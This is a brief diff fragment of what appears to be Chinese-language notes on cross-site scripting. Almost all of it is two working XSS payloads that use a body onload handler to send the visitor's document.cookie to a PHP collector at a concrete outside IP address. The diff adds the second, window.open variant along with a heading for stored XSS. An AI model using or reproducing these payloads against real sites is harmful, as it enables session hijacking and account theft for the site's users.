@@ -53,8 +53,13 @@ http://106.53.207.220/cookie.txt
 
 ````
 <body/**/onload="document.location.href='http://106.53.207.220/x.php?x='+document.cookie"></body>
+
+<body/onload="window.open('http://106.53.207.220/x.php?x='+document.cookie)"></body>
+
 ````
 
+
+* 存储型XSS
 
 
 
